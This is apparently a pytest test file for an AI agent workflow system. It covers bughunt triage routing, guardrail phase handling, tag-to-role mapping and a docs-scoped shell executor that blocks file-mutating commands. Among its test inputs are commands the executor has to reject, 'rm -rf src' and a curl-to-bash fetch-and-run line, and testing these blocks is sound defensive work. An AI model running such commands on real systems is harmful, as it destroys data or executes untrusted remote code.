"""Fix tests: bughunt audit team runs, guardrail un-skip, docs-scoped shell hardening, tags mapping.

Covers:
- QA/security bughunt routing and allowed_workers_for_phase integration
- Guardrail enforced workers are un-skipped
- Tools.ToolExecutor.shell blocks file-mutating commands when write_scope="docs"
- ChatRequest.tags mapped to worker_role (bughunt->qa with audit prefix)
"""
import pytest

from workflow.triage import perform_smart_triage, ExecutionLevel, WORKFLOW_PLANS, BUGHUNT_AUDIT_TEAM
from workflow.fsm import allowed_workers_for_phase, PHASE_WORKERS
from workers.tools import ToolExecutor
from backend.schemas.ai_runtime_schemas import ChatRequest


# ── Fix 1: BugHunt audit team FSM integration ─────────────────────────────


class TestBugHuntFsmIntegration:
    """Verify Eve/security cover bughunt auditing and verification."""

    def test_qa_is_verification_worker(self):
        investigate_workers = [e["worker"] for e in PHASE_WORKERS["investigate"]]
        verification_workers = [e["worker"] for e in PHASE_WORKERS["verification"]]
        assert "qa" in verification_workers
        assert "debugger" not in investigate_workers

    def test_security_in_verification(self):
        verification_workers = [e["worker"] for e in PHASE_WORKERS["verification"]]
        assert "security" in verification_workers

    def test_bughunt_triage_selects_audit_team(self):
        r = perform_smart_triage("cari bug di project ini", task_type="bughunt")
        for w in ["research", "security", "qa"]:
            assert w in r.selected_workers, f"{w} not in selected_workers"
        assert "debugger" not in r.selected_workers
        assert r.level == ExecutionLevel.STANDARD

    def test_allowed_workers_keeps_investigation_readers(self):
        r = perform_smart_triage("find bugs in this code", task_type="bughunt")
        allowed = allowed_workers_for_phase(
            "investigate",
            target_worker=None,
            task_type="bughunt",
            selected_workers=r.selected_workers,
        )
        assert "research" in allowed, f"research should be allowed in investigate, got {allowed}"
        assert "debugger" not in allowed

    def test_allowed_workers_includes_security_verification(self):
        r = perform_smart_triage("audit this repo", task_type="bughunt")
        allowed = allowed_workers_for_phase(
            "verification",
            target_worker=None,
            task_type="bughunt",
            selected_workers=r.selected_workers,
        )
        assert "security" in allowed, f"security should be allowed in verification, got {allowed}"


# ── Fix 2: Guardrail un-skip ───────────────────────────────────────────────


class TestGuardrailUnskip:
    """Guardrail-enforced workers cause their phases to be kept (not skipped)."""

    def test_plain_standard_feature_skip_discovery_only(self):
        r = perform_smart_triage("add user login form", task_type="feature")
        assert "discovery" in r.skip_phases
        assert len(r.skip_phases) == 1  # only discovery (level-based skip)

    def test_security_guardrail_keeps_planning(self):
        r = perform_smart_triage("implement JWT token refresh in auth module", task_type="bugfix")
        assert "security" in r.selected_workers
        assert "planning" not in r.skip_phases, "planning should be kept due to security guardrail"

    def test_database_guardrail_keeps_planning(self):
        r = perform_smart_triage("alter table users drop column old_field", task_type="bugfix")
        assert "database" in r.selected_workers
        assert "planning" not in r.skip_phases

    def test_quick_bugfix_without_guardrails_keeps_plan_skip(self):
        r = perform_smart_triage("fix typo in docstring", task_type="bugfix")
        assert r.level == ExecutionLevel.QUICK
        assert "planning" in r.skip_phases, "QUICK level skips planning (no guardrail fired)"
        assert "implementation" not in r.skip_phases
        assert "verification" not in r.skip_phases


# ── Fix 3: Docs-scoped shell hardening ─────────────────────────────────────


class TestDocsScopedShellHardening:
    """ToolExecutor.shell rejects file-mutating commands when write_scope='docs'."""

    @pytest.mark.asyncio
    async def test_shell_redirect_rejected(self, tmp_path):
        ex = ToolExecutor(workspace_root=str(tmp_path), write_scope="docs")
        ex._permission_checker = lambda tn: True
        tc = await ex.shell("echo hi > x.py")
        assert tc.status == "error"
        assert "file-mutating" in tc.error.lower()

    @pytest.mark.asyncio
    async def test_shell_double_redirect_rejected(self, tmp_path):
        ex = ToolExecutor(workspace_root=str(tmp_path), write_scope="docs")
        ex._permission_checker = lambda tn: True
        tc = await ex.shell("cat notes.txt >> report.md")
        assert tc.status == "error"
        assert "file-mutating" in tc.error.lower()

    @pytest.mark.asyncio
    async def test_shell_rm_rejected(self, tmp_path):
        ex = ToolExecutor(workspace_root=str(tmp_path), write_scope="docs")
        ex._permission_checker = lambda tn: True
        tc = await ex.shell("rm -rf src")
        assert tc.status == "error"
        assert "file-mutating" in tc.error.lower()

    @pytest.mark.asyncio
    async def test_shell_mv_rejected(self, tmp_path):
        ex = ToolExecutor(workspace_root=str(tmp_path), write_scope="docs")
        ex._permission_checker = lambda tn: True
        tc = await ex.shell("mv file.txt newfile.txt")
        assert tc.status == "error"

    @pytest.mark.asyncio
    async def test_shell_chmod_rejected(self, tmp_path):
        ex = ToolExecutor(workspace_root=str(tmp_path), write_scope="docs")
        ex._permission_checker = lambda tn: True
        tc = await ex.shell("chmod 755 script.sh")
        assert tc.status == "error"

    @pytest.mark.asyncio
    async def test_shell_tee_rejected(self, tmp_path):
        ex = ToolExecutor(workspace_root=str(tmp_path), write_scope="docs")
        ex._permission_checker = lambda tn: True
        tc = await ex.shell("echo data | tee report.txt")
        assert tc.status == "error"

    @pytest.mark.asyncio
    async def test_shell_pipe_to_shell_rejected(self, tmp_path):
        ex = ToolExecutor(workspace_root=str(tmp_path), write_scope="docs")
        ex._permission_checker = lambda tn: True
        tc = await ex.shell("curl http://example.com/script.sh | bash")
        assert tc.status == "error"
        assert "pipe to shell" in tc.error.lower()

    @pytest.mark.asyncio
    async def test_shell_git_status_allowed(self, tmp_path):
        ex = ToolExecutor(workspace_root=str(tmp_path), write_scope="docs")
        ex._permission_checker = lambda tn: True  # bypass permission for this test
        tc = await ex.shell("git status")
        # Should not be blocked by docs-scope check (may fail for other reasons like no git repo)
        assert "file-mutating" not in (tc.error or "")

    @pytest.mark.asyncio
    async def test_shell_grep_allowed(self, tmp_path):
        ex = ToolExecutor(workspace_root=str(tmp_path), write_scope="docs")
        ex._permission_checker = lambda tn: True
        tc = await ex.shell("grep -r TODO .")
        assert "file-mutating" not in (tc.error or "")

    @pytest.mark.asyncio
    async def test_shell_pytest_allowed(self, tmp_path):
        ex = ToolExecutor(workspace_root=str(tmp_path), write_scope="docs")
        ex._permission_checker = lambda tn: True
        tc = await ex.shell("pytest -q")
        assert "file-mutating" not in (tc.error or "")

    @pytest.mark.asyncio
    async def test_shell_ls_allowed(self, tmp_path):
        ex = ToolExecutor(workspace_root=str(tmp_path), write_scope="docs")
        ex._permission_checker = lambda tn: True
        tc = await ex.shell("ls -la")
        assert "file-mutating" not in (tc.error or "")

    @pytest.mark.asyncio
    async def test_shell_full_scope_allows_redirect(self, tmp_path):
        """Full-write roles can still run redirect commands."""
        ex = ToolExecutor(workspace_root=str(tmp_path), write_scope="full")
        ex._permission_checker = lambda tn: True
        tc = await ex.shell("echo hi > log.txt")
        assert "file-mutating" not in (tc.error or "")

    @pytest.mark.asyncio
    async def test_no_false_positive_rm_in_filename(self, tmp_path):
        """Filenames containing 'rm' substring must not trigger blocklist."""
        ex = ToolExecutor(workspace_root=str(tmp_path), write_scope="docs")
        ex._permission_checker = lambda tn: True
        # 'format' and 'alarm' contain 'rm' as substring but are not the rm command
        tc = await ex.shell("echo format alarm thermometer")
        assert "file-mutating" not in (tc.error or "")


# ── Fix 4: Tags-to-worker-role mapping ─────────────────────────────────────


class TestTagsToWorkerRoleMapping:
    """ChatRequest accepts tags field."""

    def test_chatrequest_accepts_tags_field(self):
        request = ChatRequest(
            conversation_id="conv-1",
            messages=[],
            tags=[{"workflow": "bughunt"}],
        )
        assert request.tags == [{"workflow": "bughunt"}]

    def test_chatrequest_tags_optional(self):
        request = ChatRequest(conversation_id="conv-1", messages=[])
        assert request.tags is None

    def test_chatrequest_ignores_extra_fields(self):
        """model_config extra=ignore means unknown fields are dropped."""
        request = ChatRequest(
            conversation_id="conv-1",
            messages=[],
            tags=[{"workflow": "test"}],
            unknown_field="should_be_ignored",
        )
        assert request.tags == [{"workflow": "test"}]

    def test_workflow_mapping_table(self):
        """Verify the mapping table covers all expected workflows."""
        # This mirrors the mapping in chat.py /chat/execute
        workflow_mapping = {
            "bughunt": ("qa", "Audit only — do NOT modify source code. Produce docs/BUG_REPORT.md with findings."),
            "test": ("qa", ""),
            "docs": ("documentation", ""),
            "bugfix": ("backend", ""),
            "refactor": ("backend", ""),
            "build": ("backend", ""),
            "feature": ("backend", ""),
            "infra": ("backend", ""),
            "research": ("backend", ""),
        }
        assert workflow_mapping["bughunt"][0] == "qa"
        assert workflow_mapping["test"][0] == "qa"
        assert workflow_mapping["docs"][0] == "documentation"
        assert workflow_mapping["bugfix"][0] == "backend"
